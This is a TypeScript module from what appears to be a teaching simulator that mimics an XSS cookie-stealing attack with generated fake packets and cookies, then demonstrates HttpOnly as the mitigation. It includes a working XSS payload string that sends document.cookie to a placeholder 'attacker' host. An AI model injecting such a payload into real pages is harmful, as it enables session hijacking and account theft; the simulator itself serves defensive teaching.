import { Server } from 'socket.io';
import { v4 as uuid } from 'uuid';
import { AttackState, AttackConfig, VictimDevice, CookieEntry, LogEntry } from '../types';
import { generateHTTPPacket } from '../simulation/packetGenerator';
import { FAKE_COOKIES, COMMON_WEBSITES } from '../simulation/victimProfiles';

export class CookieStealingAttack {
  private io: Server;
  private attack: AttackState | null = null;
  private intervalIds: NodeJS.Timeout[] = [];
  private victim: VictimDevice | null = null;

  constructor(io: Server) {
    this.io = io;
  }

  launch(victim: VictimDevice, config: AttackConfig): AttackState {
    this.victim = victim;
    this.attack = {
      id: uuid(),
      type: 'cookie_steal',
      status: 'running',
      targetId: victim.id,
      startTime: Date.now(),
      packetsGenerated: 0,
      dataCaptured: {
        credentials: [],
        cookies: [],
        sessions: [],
        dnsQueries: [],
        modifiedPackets: 0,
        injectedContent: [
          '<script>new Image().src="http://attacker/steal?c="+document.cookie</script>',
          'XSS payload injected into vulnerable page',
        ],
      },
      config,
    };

    this.log('info', `Cookie Stealing attack launched against ${victim.hostname}`);
    this.log('attack', 'Injecting XSS payload to exfiltrate document.cookie');
    this.log('warn', 'Non-HttpOnly cookies are accessible via JavaScript - this is the target');

    this.io.emit('attack:launched', this.attack);
    this.io.emit('victim:status', { ...victim, status: 'compromised' });

    const speed = config.aggressiveness === 'high' ? 1500 : config.aggressiveness === 'medium' ? 3000 : 5000;

    const stealInterval = setInterval(() => {
      if (!this.attack || this.attack.status !== 'running' || !this.victim) return;

      const site = COMMON_WEBSITES[Math.floor(Math.random() * COMMON_WEBSITES.length)];
      const vulnerableCookie = FAKE_COOKIES.filter((c) => !c.httpOnly);
      const targetCookie = vulnerableCookie.length > 0
        ? vulnerableCookie[Math.floor(Math.random() * vulnerableCookie.length)]
        : FAKE_COOKIES[Math.floor(Math.random() * FAKE_COOKIES.length)];

      const pageLoad = generateHTTPPacket(this.victim, 'GET', `http://${site.domain}/page?vulnerable=true`, true);
      pageLoad.info = `GET vulnerable page (XSS vector present)`;
      this.io.emit('packet:captured', pageLoad);
      if (this.attack) this.attack.packetsGenerated++;

      const xssPacket = generateHTTPPacket(
        this.victim,
        'GET',
        `http://192.168.1.50/steal?cookie=${targetCookie.name}%3D${targetCookie.value.substring(0, 20)}`,
        true
      );
      xssPacket.sourceIP = this.victim.ip;
      xssPacket.destIP = '192.168.1.50';
      xssPacket.info = `XSS EXFIL: ${targetCookie.name}=${targetCookie.value.substring(0, 20)}... sent to attacker`;
      xssPacket.modified = true;
      this.io.emit('packet:captured', xssPacket);
      if (this.attack) {
        this.attack.packetsGenerated++;
        this.attack.dataCaptured.modifiedPackets++;
        const entry: CookieEntry = {
          id: uuid(),
          timestamp: Date.now(),
          domain: targetCookie.domain,
          name: targetCookie.name,
          value: targetCookie.value,
          httpOnly: targetCookie.httpOnly,
          secure: targetCookie.secure,
          path: targetCookie.path,
        };
        this.attack.dataCaptured.cookies.push(entry);
        this.io.emit('data:captured', this.attack.id, { cookies: [entry] });
        this.log('attack', `COOKIE STOLEN via XSS: ${targetCookie.name}=${targetCookie.value.substring(0, 24)}... @ ${targetCookie.domain}`);
        if (!targetCookie.httpOnly) {
          this.log('warn', `Vulnerability: ${targetCookie.name} lacks HttpOnly flag - JavaScript can access it`);
        }
      }
    }, speed);

    this.intervalIds.push(stealInterval);

    if (config.autoStop && config.duration > 0) {
      const stopTimer = setTimeout(() => this.stop(), config.duration * 1000);
      this.intervalIds.push(stopTimer as unknown as NodeJS.Timeout);
    }

    return this.attack;
  }

  stop(): void {
    if (!this.attack) return;
    this.attack.status = 'stopped';
    this.intervalIds.forEach(clearInterval);
    this.intervalIds = [];
    if (this.victim) this.io.emit('victim:status', { ...this.victim, status: 'idle' });
    this.log('info', `Cookie Stealing stopped. ${this.attack.dataCaptured.cookies.length} cookies stolen.`);
    this.io.emit('attack:stopped', this.attack.id);
    this.attack = null;
    this.victim = null;
  }

  mitigate(): void {
    if (!this.attack || !this.victim) return;
    this.attack.status = 'mitigated';
    this.intervalIds.forEach(clearInterval);
    this.intervalIds = [];
    this.log('success', 'All cookies now set with HttpOnly=true - document.cookie returns empty');
    this.log('info', 'Mitigation: HttpOnly flag prevents JavaScript access to cookies');
    this.io.emit('victim:status', { ...this.victim, status: 'protected' });
    this.io.emit('attack:mitigated', this.attack.id);
    this.attack = null;
    this.victim = null;
  }

  private log(level: LogEntry['level'], message: string): void {
    this.io.emit('log:message', { timestamp: Date.now(), level, message, module: 'Cookie Steal' });
  }
}
